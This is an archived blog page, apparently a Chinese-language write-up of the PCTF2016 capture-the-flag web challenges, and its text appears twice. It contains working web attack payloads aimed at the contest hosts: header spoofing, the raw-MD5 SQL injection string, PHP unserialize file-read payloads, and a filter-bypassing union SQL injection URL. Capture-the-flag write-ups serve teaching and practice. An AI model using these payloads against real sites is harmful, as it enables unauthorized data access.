@@ -1,0 +1,796 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<title>Bendawang's Site</title>
+<link href="./PCTF2016-Web-WriteUp/font-awesome.min.css" rel="stylesheet"/>
+<link href="./PCTF2016-Web-WriteUp/screen.css" rel="stylesheet"/>
+<link href="./PCTF2016-Web-WriteUp/prism_okaidia.css" rel="stylesheet"/>
+<link href="./PCTF2016-Web-WriteUp/bendawang.css" rel="stylesheet"/>
+<script src="./PCTF2016-Web-WriteUp/jquery.min.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+<div class="show-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img src="./PCTF2016-Web-WriteUp/bendawang.png" style="display:block;width:100%;"/></a>
+</h1>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit test2 hide-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img alt="" height="115" src="./PCTF2016-Web-WriteUp/bendawang.png" width="449"/></a>
+</h1>
+</div>
+<nav class="main-nav unit test1 hide-on-mobiles">
+<ul>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+</div>
+</header>
+<script>
+$('document').ready(function(){
+    $('li[class]:eq(4)').attr('class','current');
+});
+</script>
+<section class="docs">
+<div class="grid">
+<!--移动端-->
+<div class="show-on-mobiles">
+<div class="article-info profile-block">
+<div class="article-info-block">
+               55
+               <span>文章</span>
+</div>
+<div class="article-info-block">
+               5
+               <span>标签</span>
+</div>
+</div>
+<div class="profile-block social-links">
+<table>
+<tbody><tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i></a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i></a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i></a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody></table>
+</div>
+<div class="whole show-on-mobiles">
+<article class="bdw_article">
+<div class="Bendawang" id="Bendawang_mobile">
+<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
+<div class="Bendawang_content" id="Bendawang_content_mobile"></div>
+
+<br/>
+<br/>
+<h1 id="pctf2016webwriteup">PCTF2016-Web-WriteUp</h1>
+<h2 id="web100port51">web100 PORT51</h2>
+<p style="max-width:100%;height:auto;">题目要求用本机的51端口去访问他的网站。
+好吧这是最犯蠢的一个题了。哔了狗了。本来简简单单的一行命令就解决的事儿。最简单的<code style="max-width:100%;height:auto;">payload</code>如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">curl --local-port 51 http://xxxxxxxx
+</code></pre>
+<p style="max-width:100%;height:auto;">结果最后我写了两份150行代码，因为考虑到现在的库啊什么的都没办法固定本机的端口，所以我想到了C的socket编程，先我在windows下写好之后，连<code style="max-width:100%;height:auto;">wireshark</code>抓包抓出来都没问题了，后来再<code style="max-width:100%;height:auto;">Melody</code>大神的提醒下，知道校网的NAT产生了影响，所以想到了在<code style="max-width:100%;height:auto;">VPS</code>下跑程序就可以，所以又写了一份linux下的代码，贴一下把，如下：</p>
+<pre><code class="c language-c" style="max-width:100%;height:auto;">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+#include&lt;unistd.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;sys/socket.h&gt;
+#include&lt;sys/stat.h&gt;
+#include&lt;arpa/inet.h&gt;
+#include &lt;errno.h&gt;
+#define MAXBUF 256
+char *request_head = "GET %s HTTP/1.1\r\n"
+    "Accept: text/html, application/xml, */*\r\nAccept-Language: zh-cn\r\n"
+    "Accept-Encoding: gzip, deflate\r\nHost: %s:%d\r\n"
+    "User-Agent: bendawang&amp;apos;s Browser &lt;0.1&gt;\r\nConnection: Keep-Alive\r\n\r\n";
+#define REMOTE_PORT            32772
+#define REMOTE_IP_ADDRESS "103.39.76.105"
+
+#define HTTP_DEF_PORT     32772  
+#define HTTP_BUF_SIZE   2048  
+#define HTTP_HOST_LEN    256
+#define MAX_CMD_LEN        256
+#define MAC_ADDR_LEN    12
+#define local_port 51   
+#define local_ip "XXX.XXX.XXX.XXX"  //自己的IP
+char MacAddr[MAC_ADDR_LEN+1];
+char *url= "/";
+char host[HTTP_HOST_LEN] =REMOTE_IP_ADDRESS;
+unsigned short port = HTTP_DEF_PORT;
+
+
+char* join(char *s1, char *s2)                    
+{
+    char *result =(char *) malloc(strlen(s1)+strlen(s2)+1);
+    if (result == NULL) exit (1);
+    strcpy(result, s1);
+    strcat(result, s2);
+    return result;
+}
+
+int recvn(int s, char* recvbuf, unsigned int fixedlen)
+{
+    int iResult;
+    int cnt;
+    cnt = fixedlen;
+    while ( cnt &gt; 0 ) {
+        iResult = recv(s, recvbuf, cnt, 0);
+        if ( iResult &lt; 0 ){
+            printf("Recieve error!");
+            return -1;
+        }
+        if ( iResult == 0 ){
+            printf("Connection Closed!\n");
+            return-1;
+        }
+        recvbuf +=iResult;
+        cnt -=iResult;
+    }
+    return fixedlen;
+}
+
+int http_send_client(int ClientSocket,char * a){
+    char * tempurl=url;
+    char sendbuf[HTTP_BUF_SIZE]="\0";
+    tempurl=join(tempurl,a);
+    int sendlen = sprintf(sendbuf, request_head, tempurl, host, port);
+    puts(sendbuf);
+    //printf("  %d",sendlen);
+    getchar();
+    int Ret = send(ClientSocket, sendbuf, sendlen, 0);      
+    Ret = recv(ClientSocket, sendbuf, HTTP_BUF_SIZE,0);
+    printf("%s",sendbuf);
+    getchar();
+    return Ret;
+}
+
+
+int main()
+{
+    int ssock;
+    int clen;
+    struct sockaddr_in server_addr;
+    struct sockaddr_in LocalAddr;
+    char buf[MAXBUF];
+    if((ssock=socket(PF_INET,SOCK_STREAM,IPPROTO_TCP))&lt;0){
+        perror("socket error:");
+        exit(1);
+    }
+    clen = sizeof(server_addr);
+    memset(&amp;server_addr,0,sizeof(server_addr));
+    server_addr.sin_family     =AF_INET;
+    server_addr.sin_addr.s_addr=inet_addr(REMOTE_IP_ADDRESS);
+    server_addr.sin_port       =htons(REMOTE_PORT);
+    memset(server_addr.sin_zero, 0, 8);
+
+    memset(&amp;LocalAddr,0,sizeof(LocalAddr));
+    LocalAddr.sin_family = AF_INET;
+    LocalAddr.sin_port = htons(local_port);
+    inet_pton(AF_INET,local_ip,&amp;LocalAddr.sin_addr);
+
+    int Ret= bind(ssock,(struct sockaddr*)&amp;LocalAddr,sizeof(LocalAddr));
+        //memset(server_addr.sin_zero, 0, 8);
+        //int Ret =bind(ssock,(struct sockaddr *)&amp;LocalAddr,sizeof(LocalAddr));
+        //int Ret = bind(ssock, (struct sockaddr*)&amp;LocalAddr, sizeof(LocalAddr));
+    if (Ret != 0)
+        {
+                printf("bind error\n");
+        }
+    if(connect(ssock,(struct sockaddr *)&amp;server_addr,clen)&lt;0){
+        perror("connect error:");
+        exit(1);
+    }
+    //printf("1");
+    Ret = connect(ssock,(struct sockaddr*)&amp;server_addr, sizeof(server_addr));
+    while (1){
+            http_send_client(ssock, "");
+        }
+
+    memset(buf,0,MAXBUF);
+    if(read(ssock,buf,MAXBUF)&lt;=0)
+    {
+        perror("read error:");
+        exit(1);
+    }
+    close(ssock);
+    printf("\n read: %s\n",buf);
+    return 0;
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">程序运行截图如下：
+<br/><img alt="" data-action="zoom" src="./PCTF2016-Web-WriteUp/getImagefileId=5728b2a7ab64413fd70039e6" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">所以最后的flag就是<code style="max-width:100%;height:auto;">PCTF{M45t3r_oF_CuRl}</code></p>
+<h2 id="web150localhost">web150 LOCALHOST</h2>
+<p style="max-width:100%;height:auto;">根据提示说是<code style="max-width:100%;height:auto;">localhost access only!!</code>
+那直接在请求头上加上<code style="max-width:100%;height:auto;">X-Forwarded-For:127.0.0.1</code>就可以了，如下
+<br/><img alt="" data-action="zoom" src="./PCTF2016-Web-WriteUp/getImagefileId=5728b880ab644141b1003809" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web250login">web250 Login</h2>
+<p style="max-width:100%;height:auto;">通过抓包在响应头里面看到hint如下：
+<br/><img alt="" data-action="zoom" src="./PCTF2016-Web-WriteUp/getImagefileId=5728b880ab644141b100380a" style="max-width:100%;height:auto;"/><br/></p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">hint : "select * from `admin` where password=&amp;apos;".md5($pass,true)."&amp;apos;"
+</code></pre>
+<p style="max-width:100%;height:auto;">根据http://www.ilrose.com/blog/2015/07/08/md5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84sql-%E6%B3%A8%E5%85%A5/，
+直接输入<code style="max-width:100%;height:auto;">ffifdyop</code>，得到flag为<code style="max-width:100%;height:auto;">PCTF{R4w_md5_is_d4ng3rous}</code></p>
+<h2 id="web300">web300 神盾局的秘密</h2>
+<p style="max-width:100%;height:auto;">这里查看源码看到有一个<code style="max-width:100%;height:auto;">showimg.php</code>，然后访问这个页面，并随便给参数<code style="max-width:100%;height:auto;">img</code>附一个参数，得到这个错误：
+<br/><img alt="" data-action="zoom" src="./PCTF2016-Web-WriteUp/getImagefileId=5728b880ab644141b100380c" style="max-width:100%;height:auto;"/><br/>
+读取文件错误，那么问题来了，img参数显然是base64编码的，通过img我就可以读取任意代码了，读取<code style="max-width:100%;height:auto;">showimg.php</code>代码</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+    $f = $_GET[&amp;apos;img&amp;apos;];
+    if (!empty($f)) {
+        $f = base64_decode($f);
+        if (stripos($f,&amp;apos;..&amp;apos;)===FALSE &amp;&amp; stripos($f,&amp;apos;/&amp;apos;)===FALSE &amp;&amp; stripos($f,&amp;apos;\\&amp;apos;)===FALSE
+        &amp;&amp; stripos($f,&amp;apos;pctf&amp;apos;)===FALSE) {
+            readfile($f);
+        } else {
+            echo "File not found!";
+        }
+    }
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">再看看我们的<code style="max-width:100%;height:auto;">index.php</code>的代码如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+    require_once(&amp;apos;shield.php&amp;apos;);
+    $x = new Shield();
+    isset($_GET[&amp;apos;class&amp;apos;]) &amp;&amp; $g = $_GET[&amp;apos;class&amp;apos;];
+    if (!empty($g)) {
+        $x = unserialize($g);
+    }
+    echo $x-&gt;readfile();
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">再看看我们的<code style="max-width:100%;height:auto;">sheild.php</code>:</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+    //flag is in pctf.php
+    class Shield {
+        public $file;
+        function __construct($filename = &amp;apos;&amp;apos;) {
+            $this -&gt; file = $filename;
+        }
+
+        function readfile() {
+            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&amp;apos;..&amp;apos;)===FALSE  
+            &amp;&amp; stripos($this-&gt;file,&amp;apos;/&amp;apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&amp;apos;\\&amp;apos;)==FALSE) {
+                return @file_get_contents($this-&gt;file);
+            }
+        }
+    }
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">看到hint说是<code style="max-width:100%;height:auto;">pctf.php</code>里面有flag，直接访问或是通过<code style="max-width:100%;height:auto;">showimg.php</code>都是不行的。
+其实读到<code style="max-width:100%;height:auto;">index.php</code>就应该已经看出来了这里肯定有反序列化漏洞了，
+这里先打一波自己博客的广告，之前我写过这方面的博客，大家可以看看：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">http://blog.csdn.net/qq_19876131/article/details/50926210
+</code></pre>
+<p style="max-width:100%;height:auto;">好的我们继续，然后<code style="max-width:100%;height:auto;">shield.php</code>中果然给出了<code style="max-width:100%;height:auto;">Shield</code>类，那么又说了flag在<code style="max-width:100%;height:auto;">pctf.php</code>中，那么直接给class传参获取<code style="max-width:100%;height:auto;">pctf.php</code>内容即可。那么有如下代码生成<code style="max-width:100%;height:auto;">payload</code>：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+class Shield {
+        public $file;
+        function __construct($filename = &amp;apos;&amp;apos;) {
+            $this -&gt; file = $filename;
+        }
+
+        function readfile() {
+            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&amp;apos;..&amp;apos;)===FALSE  
+            &amp;&amp; stripos($this-&gt;file,&amp;apos;/&amp;apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&amp;apos;\\&amp;apos;)==FALSE) {
+                return @file_get_contents($this-&gt;file);
+            }
+        }
+    }
+$a=new Shield();
+$a-&gt;file="pctf.php";
+echo serialize($a);
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">得到<code style="max-width:100%;height:auto;">O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}</code>
+所以最后的<code style="max-width:100%;height:auto;">payload</code>就是：</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">http://web.phrack.top:32779/?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}
+</code></pre>
+<p style="max-width:100%;height:auto;">在源码里面看到flag：
+<br/><img alt="" data-action="zoom" src="./PCTF2016-Web-WriteUp/getImagefileId=5728b880ab644141b100380b" style="max-width:100%;height:auto;"/><br/>
+即<code style="max-width:100%;height:auto;">PCTF{W3lcome_To_Shi3ld_secret_Ar3a}</code></p>
+<h2 id="web500inamess">web500 IN A Mess</h2>
+<p style="max-width:100%;height:auto;">在源码中获得提示<code style="max-width:100%;height:auto;">index.phps</code>，访问后得到代码如下，不由得吐槽一句，终于遇到最喜欢的代码题了，爆炸。。</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+
+error_reporting(0);
+echo "&lt;!--index.phps--&gt;";
+
+if(!$_GET[&amp;apos;id&amp;apos;])
+{
+    header(&amp;apos;Location: index.php?id=1&amp;apos;);
+    exit();
+}
+$id=$_GET[&amp;apos;id&amp;apos;];
+$a=$_GET[&amp;apos;a&amp;apos;];
+$b=$_GET[&amp;apos;b&amp;apos;];
+if(stripos($a,&amp;apos;.&amp;apos;))
+{
+    echo &amp;apos;Hahahahahaha&amp;apos;;
+    return ;
+}
+$data = @file_get_contents($a,&amp;apos;r&amp;apos;);
+if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
+{
+    require("flag.txt");
+}
+else
+{
+    print "work harder!harder!harder!";
+}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">先看参数<code style="max-width:100%;height:auto;">id</code>，有代码可知id=0a，弱类型比较。
+再看看<code style="max-width:100%;height:auto;">a</code>，他要输入一个文件使内容为<code style="max-width:100%;height:auto;">1112 is a nice lab!</code>,在自己的服务器上建一个名为<code style="max-width:100%;height:auto;">1</code>的文件内容就是<code style="max-width:100%;height:auto;">1112 is a nice lab!</code>，然后把自己的服务器ip转为<code style="max-width:100%;height:auto;">10进制ip</code>来绕过对<code style="max-width:100%;height:auto;">.</code>的匹配。
+最后是<code style="max-width:100%;height:auto;">b</code>，已知<code style="max-width:100%;height:auto;">eregi</code>遇到%00终止，那么我们直接构造<code style="max-width:100%;height:auto;">b=%0044444
+</code>绕过之后得到如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./PCTF2016-Web-WriteUp/getImagefileId=5728bc43ab644141b100382c" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">一看到就激动了，发现并不是flag，好吧，我的第一反应是vim里面的正则，<code style="max-width:100%;height:auto;">/</code>是搜索嘛，然后后面恰好又是一个正则，那么flag一定就是<code style="max-width:100%;height:auto;">HT2mCpcvOLf</code>这个了，结果并不是。。
+。
+。
+。
+。
+折腾了好久，后来才发现把它复制到url上。。。然后进入到本题的第二个部分，注入注入！
+试了试，过滤不多，就过滤了像是空格啊，回车啊，tab啊之类根本没什么屁用的东西，像是select，from什么的也都只被正则替换了一次，用<code style="max-width:100%;height:auto;">selselectect</code>就能绕过，另外还过滤了<code style="max-width:100%;height:auto;">08</code>，<code style="max-width:100%;height:auto;">09</code>,<code style="max-width:100%;height:auto;">20</code>等等敏感的数字。
+好吧，这里我再次犯了个蠢，我不知道当时怎么搞的，我以为<code style="max-width:100%;height:auto;">union</code>被完全过滤了，害的我后面用盲注，明明直接可以很简单就爆出来的。
+报警了。
+盲注坑就坑在它过滤了08,09,0a,20等等，那么在脚本爆破的时候，像是120,0x0a，20这些数字都是血崩的，最后我是脚本盲注加手调出来的。
+脚本我就不贴了（忘了丢哪儿去了），反正比较简单,主要是一定要手动确认下各个位置，最后爆出来就是一个表<code style="max-width:100%;height:auto;">content</code>表，和三个字段<code style="max-width:100%;height:auto;">id,context,title</code>。
+flag就在context字段里面,而那个<code style="max-width:100%;height:auto;">hi666</code>就是<code style="max-width:100%;height:auto;">title</code>字段的值。
+.
+.
+.
+后来才醒悟过来<code style="max-width:100%;height:auto;">union</code>也和<code style="max-width:100%;height:auto;">select</code>之流一样并没有被完全过滤，真是蠢啊！！！</p>
+<p style="max-width:100%;height:auto;">后来试了试用<code style="max-width:100%;height:auto;">union</code>去回显爆库，它是总共有三个字段，显示的是第三个字段，像是空格被过滤的话用各种括号就可以绕过了，最后的<code style="max-width:100%;height:auto;">payload</code>如下：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">http://web.phrack.top:32783/^HT2mCpcvOLf/index.php?id=0%26(1=2)uniounionn(selselectect(1),(2),(context)frfromom(content))
+</code></pre>
+<p style="max-width:100%;height:auto;">得到最后的flag就是<code style="max-width:100%;height:auto;">PCTF{Fin4lly_U_got_i7_C0ngRatulation5}</code></p>
+<p style="max-width:100%;height:auto;">真是哔了狗了，明明很简单的题，总是自己搞复杂了。炸！
+不过也没事儿，盲注毕竟是万能了，当做熟悉下好了。（真的没有安慰自己）</p>
+<h2 id="web350flag">web350  flag在管理员手里</h2>
+<p style="max-width:100%;height:auto;">一道原题不想去再看了，索性就没做了，放个链接
+http://www.2cto.com/Article/201405/298779.html</p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+
+
+
+<!--PC端-->
+<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
+<div class="inner profile-inner">
+<div class="base-info profile-block">
+<img id="avatar" src="./PCTF2016-Web-WriteUp/logo.jpg"/>
+<h2 id="name" style="text-align:center">Bendawang</h2>
+<span id="location" style="font-size:18px">
+<i class="fa fa-map-marker"></i>SiChuan, China</span>
+<a href="/about" id="follow">联系我</a></div>
+<div class="article-info profile-block">
+<div class="article-info-block">
+        55
+          <span>文章</span></div>
+<div class="article-info-block">
+        5
+          <span>标签</span></div>
+</div>
+<div class="profile-block social-links hide-on-mobiles">
+<table>
+<tbody>
+<tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i>
+</a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i>
+</a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i>
+</a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<div class="unit three-quarters hide-on-mobiles">
+<article class="bdw_article">
+<h1 id="pctf2016webwriteup">PCTF2016-Web-WriteUp</h1>
+<h2 id="web100port51">web100 PORT51</h2>
+<p style="max-width:100%;height:auto;">题目要求用本机的51端口去访问他的网站。
+好吧这是最犯蠢的一个题了。哔了狗了。本来简简单单的一行命令就解决的事儿。最简单的<code style="max-width:100%;height:auto;">payload</code>如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">curl --local-port 51 http://xxxxxxxx
+</code></pre>
+<p style="max-width:100%;height:auto;">结果最后我写了两份150行代码，因为考虑到现在的库啊什么的都没办法固定本机的端口，所以我想到了C的socket编程，先我在windows下写好之后，连<code style="max-width:100%;height:auto;">wireshark</code>抓包抓出来都没问题了，后来再<code style="max-width:100%;height:auto;">Melody</code>大神的提醒下，知道校网的NAT产生了影响，所以想到了在<code style="max-width:100%;height:auto;">VPS</code>下跑程序就可以，所以又写了一份linux下的代码，贴一下把，如下：</p>
+<pre><code class="c language-c" style="max-width:100%;height:auto;">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+#include&lt;unistd.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;sys/socket.h&gt;
+#include&lt;sys/stat.h&gt;
+#include&lt;arpa/inet.h&gt;
+#include &lt;errno.h&gt;
+#define MAXBUF 256
+char *request_head = "GET %s HTTP/1.1\r\n"
+    "Accept: text/html, application/xml, */*\r\nAccept-Language: zh-cn\r\n"
+    "Accept-Encoding: gzip, deflate\r\nHost: %s:%d\r\n"
+    "User-Agent: bendawang&amp;apos;s Browser &lt;0.1&gt;\r\nConnection: Keep-Alive\r\n\r\n";
+#define REMOTE_PORT            32772
+#define REMOTE_IP_ADDRESS "103.39.76.105"
+
+#define HTTP_DEF_PORT     32772  
+#define HTTP_BUF_SIZE   2048  
+#define HTTP_HOST_LEN    256
+#define MAX_CMD_LEN        256
+#define MAC_ADDR_LEN    12
+#define local_port 51   
+#define local_ip "XXX.XXX.XXX.XXX"  //自己的IP
+char MacAddr[MAC_ADDR_LEN+1];
+char *url= "/";
+char host[HTTP_HOST_LEN] =REMOTE_IP_ADDRESS;
+unsigned short port = HTTP_DEF_PORT;
+
+
+char* join(char *s1, char *s2)                    
+{
+    char *result =(char *) malloc(strlen(s1)+strlen(s2)+1);
+    if (result == NULL) exit (1);
+    strcpy(result, s1);
+    strcat(result, s2);
+    return result;
+}
+
+int recvn(int s, char* recvbuf, unsigned int fixedlen)
+{
+    int iResult;
+    int cnt;
+    cnt = fixedlen;
+    while ( cnt &gt; 0 ) {
+        iResult = recv(s, recvbuf, cnt, 0);
+        if ( iResult &lt; 0 ){
+            printf("Recieve error!");
+            return -1;
+        }
+        if ( iResult == 0 ){
+            printf("Connection Closed!\n");
+            return-1;
+        }
+        recvbuf +=iResult;
+        cnt -=iResult;
+    }
+    return fixedlen;
+}
+
+int http_send_client(int ClientSocket,char * a){
+    char * tempurl=url;
+    char sendbuf[HTTP_BUF_SIZE]="\0";
+    tempurl=join(tempurl,a);
+    int sendlen = sprintf(sendbuf, request_head, tempurl, host, port);
+    puts(sendbuf);
+    //printf("  %d",sendlen);
+    getchar();
+    int Ret = send(ClientSocket, sendbuf, sendlen, 0);      
+    Ret = recv(ClientSocket, sendbuf, HTTP_BUF_SIZE,0);
+    printf("%s",sendbuf);
+    getchar();
+    return Ret;
+}
+
+
+int main()
+{
+    int ssock;
+    int clen;
+    struct sockaddr_in server_addr;
+    struct sockaddr_in LocalAddr;
+    char buf[MAXBUF];
+    if((ssock=socket(PF_INET,SOCK_STREAM,IPPROTO_TCP))&lt;0){
+        perror("socket error:");
+        exit(1);
+    }
+    clen = sizeof(server_addr);
+    memset(&amp;server_addr,0,sizeof(server_addr));
+    server_addr.sin_family     =AF_INET;
+    server_addr.sin_addr.s_addr=inet_addr(REMOTE_IP_ADDRESS);
+    server_addr.sin_port       =htons(REMOTE_PORT);
+    memset(server_addr.sin_zero, 0, 8);
+
+    memset(&amp;LocalAddr,0,sizeof(LocalAddr));
+    LocalAddr.sin_family = AF_INET;
+    LocalAddr.sin_port = htons(local_port);
+    inet_pton(AF_INET,local_ip,&amp;LocalAddr.sin_addr);
+
+    int Ret= bind(ssock,(struct sockaddr*)&amp;LocalAddr,sizeof(LocalAddr));
+        //memset(server_addr.sin_zero, 0, 8);
+        //int Ret =bind(ssock,(struct sockaddr *)&amp;LocalAddr,sizeof(LocalAddr));
+        //int Ret = bind(ssock, (struct sockaddr*)&amp;LocalAddr, sizeof(LocalAddr));
+    if (Ret != 0)
+        {
+                printf("bind error\n");
+        }
+    if(connect(ssock,(struct sockaddr *)&amp;server_addr,clen)&lt;0){
+        perror("connect error:");
+        exit(1);
+    }
+    //printf("1");
+    Ret = connect(ssock,(struct sockaddr*)&amp;server_addr, sizeof(server_addr));
+    while (1){
+            http_send_client(ssock, "");
+        }
+
+    memset(buf,0,MAXBUF);
+    if(read(ssock,buf,MAXBUF)&lt;=0)
+    {
+        perror("read error:");
+        exit(1);
+    }
+    close(ssock);
+    printf("\n read: %s\n",buf);
+    return 0;
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">程序运行截图如下：
+<br/><img alt="" data-action="zoom" src="./PCTF2016-Web-WriteUp/getImagefileId=5728b2a7ab64413fd70039e6" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">所以最后的flag就是<code style="max-width:100%;height:auto;">PCTF{M45t3r_oF_CuRl}</code></p>
+<h2 id="web150localhost">web150 LOCALHOST</h2>
+<p style="max-width:100%;height:auto;">根据提示说是<code style="max-width:100%;height:auto;">localhost access only!!</code>
+那直接在请求头上加上<code style="max-width:100%;height:auto;">X-Forwarded-For:127.0.0.1</code>就可以了，如下
+<br/><img alt="" data-action="zoom" src="./PCTF2016-Web-WriteUp/getImagefileId=5728b880ab644141b1003809" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web250login">web250 Login</h2>
+<p style="max-width:100%;height:auto;">通过抓包在响应头里面看到hint如下：
+<br/><img alt="" data-action="zoom" src="./PCTF2016-Web-WriteUp/getImagefileId=5728b880ab644141b100380a" style="max-width:100%;height:auto;"/><br/></p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">hint : "select * from `admin` where password=&amp;apos;".md5($pass,true)."&amp;apos;"
+</code></pre>
+<p style="max-width:100%;height:auto;">根据http://www.ilrose.com/blog/2015/07/08/md5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84sql-%E6%B3%A8%E5%85%A5/，
+直接输入<code style="max-width:100%;height:auto;">ffifdyop</code>，得到flag为<code style="max-width:100%;height:auto;">PCTF{R4w_md5_is_d4ng3rous}</code></p>
+<h2 id="web300">web300 神盾局的秘密</h2>
+<p style="max-width:100%;height:auto;">这里查看源码看到有一个<code style="max-width:100%;height:auto;">showimg.php</code>，然后访问这个页面，并随便给参数<code style="max-width:100%;height:auto;">img</code>附一个参数，得到这个错误：
+<br/><img alt="" data-action="zoom" src="./PCTF2016-Web-WriteUp/getImagefileId=5728b880ab644141b100380c" style="max-width:100%;height:auto;"/><br/>
+读取文件错误，那么问题来了，img参数显然是base64编码的，通过img我就可以读取任意代码了，读取<code style="max-width:100%;height:auto;">showimg.php</code>代码</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+    $f = $_GET[&amp;apos;img&amp;apos;];
+    if (!empty($f)) {
+        $f = base64_decode($f);
+        if (stripos($f,&amp;apos;..&amp;apos;)===FALSE &amp;&amp; stripos($f,&amp;apos;/&amp;apos;)===FALSE &amp;&amp; stripos($f,&amp;apos;\\&amp;apos;)===FALSE
+        &amp;&amp; stripos($f,&amp;apos;pctf&amp;apos;)===FALSE) {
+            readfile($f);
+        } else {
+            echo "File not found!";
+        }
+    }
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">再看看我们的<code style="max-width:100%;height:auto;">index.php</code>的代码如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+    require_once(&amp;apos;shield.php&amp;apos;);
+    $x = new Shield();
+    isset($_GET[&amp;apos;class&amp;apos;]) &amp;&amp; $g = $_GET[&amp;apos;class&amp;apos;];
+    if (!empty($g)) {
+        $x = unserialize($g);
+    }
+    echo $x-&gt;readfile();
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">再看看我们的<code style="max-width:100%;height:auto;">sheild.php</code>:</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+    //flag is in pctf.php
+    class Shield {
+        public $file;
+        function __construct($filename = &amp;apos;&amp;apos;) {
+            $this -&gt; file = $filename;
+        }
+
+        function readfile() {
+            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&amp;apos;..&amp;apos;)===FALSE  
+            &amp;&amp; stripos($this-&gt;file,&amp;apos;/&amp;apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&amp;apos;\\&amp;apos;)==FALSE) {
+                return @file_get_contents($this-&gt;file);
+            }
+        }
+    }
+?&gt;
+</code></pre>
